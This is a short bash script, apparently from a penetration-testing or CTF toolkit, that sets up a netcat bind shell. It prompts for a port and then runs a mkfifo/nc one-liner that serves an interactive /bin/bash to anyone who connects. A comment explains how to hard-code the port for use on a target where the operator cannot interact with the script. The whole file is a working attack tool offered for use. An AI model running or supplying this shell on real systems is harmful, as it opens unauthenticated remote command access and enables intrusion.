#!/bin/bash
#script to set up a Bind Shell using NetCat

#input [l]ocal [port] that the target system will listen on
echo "Enter the listening port on RHOST"
read LPORT
echo "Press [Enter] to start bind shell"
read enter
echo "Starting bind shell on port $LPORT"

#if you don't have the means to interact with the script you can comment out 
#above and just replace the "$LPORT" below with the target port
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp $LPORT >/tmp/f
